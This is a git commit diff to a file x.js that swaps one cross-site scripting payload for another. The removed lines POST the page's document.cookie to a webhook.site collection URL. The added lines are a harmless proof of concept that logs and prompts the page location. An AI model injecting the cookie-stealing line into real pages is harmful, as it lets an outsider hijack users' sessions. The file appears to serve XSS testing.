d398320772952050d44b17a4f1d4741d97a4cba9
rotimi-epitech <olympe.chabi-ague@epitech.eu>
2025-05-07 12:59:33 +0100

    Update x.js

--- x.js
+++ x.js
@@ -1,4 +1,8 @@
-fetch("https://webhook.site/0578b476-d2d4-4b65-a016-a583cfdad8ea", {
-  method: "POST",
-  body: document.cookie
-});
+function xssPayload() {
+  const alertMsg = 'xss ' + document.location;
+  console.log(alertMsg);
+  window.prompt(alertMsg);
+}
+
+console.log('XSS payload executed');
+xssPayload();
